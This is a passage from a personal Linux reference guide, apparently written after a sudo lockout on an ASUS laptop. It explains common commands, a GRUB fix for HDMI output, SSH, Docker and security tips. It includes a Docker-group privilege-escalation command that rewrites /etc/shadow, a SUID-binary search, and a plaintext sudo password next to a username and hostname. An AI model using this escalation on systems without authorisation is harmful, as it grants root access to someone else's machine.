| `enable` | Start automatically on boot |
| `disable` | Don't start on boot |
| `set-default` | Set the default boot target |

We used it:
```bash
systemctl status gdm3                      # Check if GDM is running
systemctl enable gdm3                      # Make GDM start on boot
sudo systemctl set-default graphical.target # Boot into GUI mode by default
```

**Boot targets:**
```
graphical.target  = Boot into GUI (runs display manager)
multi-user.target = Boot into terminal only (what you had as a "server")
rescue.target     = Single-user recovery mode
```

---

### `nano`
**What it does:** Simple text editor in the terminal.

```bash
sudo nano /etc/default/grub
```

| Shortcut | What it does |
|----------|-------------|
| `Ctrl+X` | Exit |
| `Ctrl+O` | Save (Write Out) |
| `Ctrl+W` | Search |
| `Ctrl+K` | Cut line |
| `Ctrl+U` | Paste line |
| `Y/N` | Confirm save when exiting |

---

### `update-grub`
**What it does:** Regenerates `/boot/grub/grub.cfg` from `/etc/default/grub`.

```bash
sudo update-grub
```

This is actually a shortcut for:
```bash
sudo grub-mkconfig -o /boot/grub/grub.cfg
```

**Why two files?**
```
/etc/default/grub          ← You edit THIS (simple key=value format)
        │
        │  update-grub reads this and generates:
        ▼
/boot/grub/grub.cfg        ← GRUB reads THIS (complex script format, never edit manually)
```

---

### `lsmod`
**What it does:** Lists loaded kernel modules (drivers).

```bash
lsmod                    # List all loaded modules
lsmod | grep nvidia      # Check if NVIDIA driver is loaded
```

Output format:
```
Module          Size  Used by
nvidia_drm      135168  4         ← 4 things are using this module
nvidia_modeset  1736704  3
nvidia          11534336  33      ← Main NVIDIA driver, 33 users
```

---

### `xrandr`
**What it does:** Manages display outputs (resolution, rotation, which monitors are active).

```bash
xrandr                                        # List all displays and their modes
xrandr --output HDMI-1-0 --auto               # Enable HDMI with auto-detected settings
xrandr --output eDP-1 --off                   # Turn off internal display
xrandr --output HDMI-1-0 --auto --primary     # Set HDMI as primary display
```

| Flag | What it does |
|------|-------------|
| `--output NAME` | Select which display to configure |
| `--auto` | Auto-detect best resolution |
| `--off` | Turn display off |
| `--primary` | Set as primary display |
| `--mode 1920x1080` | Set specific resolution |
| `--display :0` | Connect to specific X display |

**Important:** xrandr only works when connected to an X display server. Over SSH, you get "Can't open display" because there's no display server in your SSH session.

---

### `apt`
**What it does:** Package manager for Ubuntu/Debian — installs, updates, removes software.

```bash
sudo apt update                          # Refresh package lists from servers
sudo apt install -y ubuntu-desktop-minimal  # Install package
sudo apt upgrade -y                      # Upgrade all packages
```

| Command | What it does |
|---------|-------------|
| `apt update` | Download latest package lists (doesn't install anything) |
| `apt upgrade` | Upgrade all installed packages to latest versions |
| `apt install pkg` | Install a package |
| `apt remove pkg` | Remove a package (keep config) |
| `apt purge pkg` | Remove package AND its config |
| `apt autoremove` | Remove unused dependency packages |
| `apt search keyword` | Search for packages |

| Flag | What it does |
|------|-------------|
| `-y` | **Yes** — auto-confirm, don't ask "Do you want to continue?" |

**`apt update` vs `apt upgrade`:**
```
apt update   = "Check what's available" (like refreshing an app store)
apt upgrade  = "Download and install updates" (like hitting "Update All")
```

Always run `update` before `install` or `upgrade`.

---

### `find`
**What it does:** Searches for files based on criteria.

```bash
find /starting/path [options]
```

| Flag | What it does |
|------|-------------|
| `-name "pattern"` | Match filename |
| `-type f` | Files only |
| `-type d` | Directories only |
| `-perm -4000` | Files with specific permissions |
| `-user root` | Files owned by specific user |
| `-exec cmd {} \;` | Run command on each result |

We used it:
```bash
find / -perm -4000 -type f 2>/dev/null
#  │    │           │       │
#  │    │           │       └── 2>/dev/null: hide "permission denied" errors
#  │    │           │           (2 = stderr, > = redirect, /dev/null = black hole)
#  │    │           └── Only files (not directories)
#  │    └── -4000 = SUID bit set (these run as the file owner, not the user)
#  │        SUID binaries owned by root = potential privilege escalation
#  └── Start searching from root (entire filesystem)
```

---

### `journalctl`
**What it does:** Reads systemd logs.

```bash
journalctl -u gdm3              # Logs for gdm3 service
journalctl -b                   # Logs since last boot
journalctl -b -u gdm3 | tail -30  # Last 30 lines of gdm3 logs from this boot
```

| Flag | What it does |
|------|-------------|
| `-u service` | Filter by **unit** (service name) |
| `-b` | Current **boot** only |
| `-f` | **Follow** — live stream (like `tail -f`) |
| `-n 50` | Last **N** lines |
| `--no-pager` | Print to terminal instead of pager |

---

### The Pipe `|` and Redirection `>` `>>` `2>`

These aren't commands — they're **shell operators** that connect commands together.

```bash
# PIPE: Send output of one command as input to another
command1 | command2 | command3
# command1's output → command2's input → command3's input

# Examples:
dpkg -l | grep gdm              # List packages, filter for "gdm"
cat /etc/passwd | grep rajneesh  # Read file, filter for your name
lsmod | grep nvidia              # List modules, filter for nvidia

# REDIRECT OUTPUT: Write to a file
echo "text" > file.txt           # Write (overwrites existing content)
echo "more" >> file.txt          # Append (adds to end of file)

# REDIRECT ERRORS:
find / -name "*.conf" 2>/dev/null   # Throw away error messages
command > output.txt 2>&1           # Send both output AND errors to file
```

```
File Descriptor Numbers:
0 = stdin  (input)
1 = stdout (normal output)
2 = stderr (error output)

2>/dev/null = "send errors to the void"
2>&1        = "send errors wherever output goes"
```

---

### Variable Assignment and `$()`

```bash
# Simple variable:
NAME="rajneesh"
echo $NAME                # Prints: rajneesh

# Command substitution — run a command and capture its output:
HASH=$(openssl passwd -6 MyP@ssw0rd123)
echo $HASH                # Prints: $6$salt$hash...

# The $() runs the command inside and replaces itself with the output:
echo "Today is $(date)"   # Prints: Today is Fri Mar 20 20:00:00 IST 2026
```

We used this:
```bash
HASH=$(openssl passwd -6 MyP@ssw0rd123) && docker run ... sed ... "$HASH" ...
#                                ││
#                                └└── && means "only run the next command if the previous one SUCCEEDED"
```

**`&&` vs `;` vs `||`:**
```bash
cmd1 && cmd2     # Run cmd2 ONLY IF cmd1 succeeded (exit code 0)
cmd1 || cmd2     # Run cmd2 ONLY IF cmd1 failed (exit code non-zero)
cmd1 ;  cmd2     # Run cmd2 regardless of whether cmd1 succeeded
```

We used `&&` because we only want to run the Docker command if the hash was generated successfully.

---

### Quick Reference: Our Exact Recovery Sequence

```bash
# 1. CHECK GROUPS (found docker group!)
id

# 2. GENERATE PASSWORD HASH
HASH=$(openssl passwd -6 MyP@ssw0rd123)

# 3. USE DOCKER TO OVERWRITE PASSWORD IN /etc/shadow
docker run -v /etc:/mnt --rm ubuntu sed -i "s|rajneesh-mishra:[^:]*|rajneesh-mishra:$HASH|" /mnt/shadow

# 4. TEST IT
sudo whoami    # Enter MyP@ssw0rd123 → prints "root" 🎉

# 5. FIX GRUB FOR HDMI OUTPUT
sudo nano /etc/default/grub
# Changed: GRUB_CMDLINE_LINUX_DEFAULT="quiet splash video=eDP-1:d video=HDMI-A-1:e"
sudo update-grub

# 6. REBOOT
sudo reboot

# 7. VERIFY DISPLAYS
cat /sys/class/drm/card1-eDP-1/enabled      # disabled ✓
cat /sys/class/drm/card2-HDMI-A-1/status     # connected ✓
```

---

## 7. The HDMI/GPU Saga — Hybrid Graphics Explained

### Your Hardware Layout

```
┌─────────────────────────────────────────────────┐
│                ASUS TUF F15                      │
│                                                  │
│   Intel UHD (card1) ──── eDP-1 ──── Laptop      │
│   PCI 00:02.0           (internal)   Screen      │
│                                      (BROKEN)    │
│                                                  │
│   NVIDIA GTX (card2) ── HDMI-A-1 ── External    │
│   PCI 01:00.0           (external)   Monitor     │
│                       ── DP-1                     │
│                          (unused)                │
└─────────────────────────────────────────────────┘
```

### Why the GUI Wasn't Showing on HDMI

1. GDM was running but outputting to `eDP-1` (broken internal screen)
2. NVIDIA driver manages HDMI, but kernel parameter `video=HDMI-A-1:e` targets the kernel framebuffer, not NVIDIA
3. NVIDIA uses its own connector name: `HDMI-1-0` (seen in Xorg.log)

### What Fixed It

```bash
# In /etc/default/grub:
GRUB_CMDLINE_LINUX_DEFAULT="quiet splash video=eDP-1:d video=HDMI-A-1:e"
```

- `video=eDP-1:d` — **Disabled** the internal display at kernel level
- With internal display disabled, NVIDIA/Xorg had no choice but to use HDMI
- After `update-grub && reboot`, the login screen appeared on the external monitor

---

## 8. Linux Essentials Guide

### File System Hierarchy

```
/                   Root of everything
├── /bin            Essential commands (ls, cp, mv)
├── /boot           Kernel and GRUB files
│   └── /grub       GRUB bootloader config
├── /dev            Device files (disks, terminals)
├── /etc            System configuration files
│   ├── /default    Default configs (including GRUB)
│   ├── /shadow     Password hashes (root only)
│   ├── /passwd     User account info (readable by all)
│   ├── /sudoers    Sudo permissions
│   ├── /fstab      Disk mount configuration
│   └── /ssh        SSH server config
├── /home           User home directories
├── /proc           Process information (virtual)
├── /root           Root user's home directory
├── /sys            Kernel/hardware info (virtual)
├── /tmp            Temporary files
├── /usr            User programs and libraries
├── /var            Variable data (logs, databases)
│   └── /log        System logs
└── /snap           Snap packages
```

### Essential Commands

#### Navigation & Files
```bash
pwd                     # Print current directory
ls -la                  # List all files with details
cd /path/to/dir         # Change directory
mkdir -p dir/subdir     # Create nested directories
cp -r source dest       # Copy recursively
mv source dest          # Move/rename
rm -rf dir              # Delete recursively (CAREFUL!)
find / -name "file"     # Find files by name
which command           # Find where a command lives
```

#### File Permissions
```bash
# Permission format: rwxrwxrwx
#                    │  │  │
#                    │  │  └── Others (everyone else)
#                    │  └── Group
#                    └── Owner
#
# r=read(4) w=write(2) x=execute(1)

chmod 755 file          # rwxr-xr-x (owner: all, others: read+execute)
chmod 600 file          # rw------- (owner: read+write only)
chown user:group file   # Change ownership
```

#### User Management
```bash
id                      # Show your UID, GID, and groups
whoami                  # Current username
groups                  # List your groups
sudo useradd -m user    # Create new user with home directory
sudo usermod -aG group user  # Add user to group
sudo passwd user        # Change user's password
su - user               # Switch to another user
```

#### System Information
```bash
uname -a                # Kernel version and architecture
cat /etc/os-release     # OS version
df -h                   # Disk usage (human-readable)
free -h                 # Memory usage
top / htop              # Running processes
uptime                  # How long system has been running
ip addr                 # Network interfaces and IPs
ss -tulnp               # Open ports and listening services
```

#### Service Management (systemd)
```bash
systemctl status service    # Check service status
systemctl start service     # Start a service
systemctl stop service      # Stop a service
systemctl restart service   # Restart a service
systemctl enable service    # Auto-start on boot
systemctl disable service   # Don't auto-start
systemctl list-units        # List all active units
journalctl -u service -f    # Follow service logs live
```

#### Package Management (apt — Debian/Ubuntu)
```bash
sudo apt update             # Refresh package lists
sudo apt upgrade -y         # Upgrade all packages
sudo apt install package    # Install a package
sudo apt remove package     # Remove a package
sudo apt autoremove         # Clean up unused dependencies
apt search keyword          # Search for packages
apt show package            # Show package details
dpkg -l | grep package      # Check if installed
```

#### Networking
```bash
ip addr                     # Show IP addresses
ip route                    # Show routing table
ping host                   # Test connectivity
curl -s ifconfig.me         # Get public IP
ssh user@host               # SSH into remote machine
scp file user@host:/path    # Copy file over SSH
ssh-keygen -t ed25519       # Generate SSH key pair
netstat -tulnp              # Open ports (legacy)
ss -tulnp                   # Open ports (modern)
```

#### Process Management
```bash
ps aux                      # List all processes
ps aux | grep name          # Find specific process
kill PID                    # Gracefully stop a process
kill -9 PID                 # Force kill a process
killall name                # Kill all processes by name
nohup command &             # Run command that survives logout
```

#### Disk & Storage
```bash
lsblk                      # List block devices (disks/partitions)
fdisk -l                    # Detailed disk info
mount /dev/sdX /mnt         # Mount a partition
umount /mnt                 # Unmount
du -sh /path                # Directory size
```

#### Logs & Troubleshooting
```bash
journalctl -b               # All logs from current boot
journalctl -b -1             # Logs from previous boot
journalctl -u service        # Logs for specific service
dmesg                        # Kernel messages
tail -f /var/log/syslog      # Follow system log live
last                         # Login history
```

### SSH Essentials

#### Setting Up SSH Key Auth (More Secure Than Passwords)
```bash
# On your Mac (client):
ssh-keygen -t ed25519 -C "your-email"
ssh-copy-id user@server-ip

# Now you can SSH without typing a password
ssh user@server-ip
```

#### SSH Config File (`~/.ssh/config` on Mac)
```
Host asus
    HostName rj-tuf.duckdns.org
    User rajneesh-mishra
    IdentityFile ~/.ssh/id_ed25519
```
Now just type `ssh asus` instead of the full command.

#### Keep SSH Session Alive
```
# In ~/.ssh/config on Mac:
Host *
    ServerAliveInterval 60
    ServerAliveCountMax 3
```

### Docker Essentials

```bash
docker ps                   # Running containers
docker ps -a                # All containers (including stopped)
docker images               # List downloaded images
docker run -it ubuntu bash  # Run interactive Ubuntu container
docker run -d nginx         # Run container in background
docker stop container_id    # Stop container
docker rm container_id      # Remove container
docker rmi image_id         # Remove image
docker logs container_id    # View container logs
docker exec -it container bash  # Shell into running container

# Volume mounts (how we hacked the password):
docker run -v /host/path:/container/path image command
```

### Security Best Practices

1. **Keep passwords in a password manager** (not a text file!)
   - Use Bitwarden, 1Password, or KeePass
   - If you MUST use a file, encrypt it with `gpg`

2. **Use SSH keys instead of passwords**
   ```bash
   # Disable password auth in /etc/ssh/sshd_config:
   PasswordAuthentication no
   ```

3. **Be careful with the `docker` group**
   - Docker group = root access
   - Only add users you fully trust

4. **Keep system updated**
   ```bash
   sudo apt update && sudo apt upgrade -y
   ```

5. **Set up a firewall**
   ```bash
   sudo ufw enable
   sudo ufw allow ssh
   sudo ufw allow 80/tcp    # HTTP
   sudo ufw allow 443/tcp   # HTTPS
   sudo ufw status
   ```

6. **Set up fail2ban** (blocks brute force SSH attempts)
   ```bash
   sudo apt install fail2ban
   sudo systemctl enable fail2ban
   ```

### Quick Recovery Cheat Sheet

If you ever get locked out of sudo again:

```bash
# Method 1: Docker (if you're in the docker group)
HASH=$(openssl passwd -6 newpassword)
docker run -v /etc:/mnt --rm ubuntu sed -i "s|username:[^:]*|username:$HASH|" /mnt/shadow

# Method 2: LXD (if you're in the lxd group)
# Similar concept — containers that can mount host filesystem

# Method 3: GRUB Recovery (if you have a monitor)
# Boot -> Hold Shift -> Advanced Options -> Recovery -> Root Shell
mount -o remount,rw /
passwd username

# Method 4: Physical SSD removal
# Remove NVMe -> USB adapter -> Mount on another machine -> Edit shadow file

# Method 5: Live USB
# Boot from Ubuntu USB -> Mount partition -> chroot -> passwd
```

---

## Final Words

The whole saga boiled down to three things:

1. **A stale password file** — Always update your records when you change passwords
2. **Docker group = root** — A security feature that became your escape hatch
3. **Hybrid GPU quirks** — HDMI on NVIDIA, internal screen on Intel, and they play by different rules

**Remember:** `MyP@ssw0rd123` is your sudo password. Go update that `password.txt`. Or better yet, use a proper password manager.

---
*Written after the great lockout of March 20, 2026*
*Recovered via Docker privilege escalation in ~45 minutes*
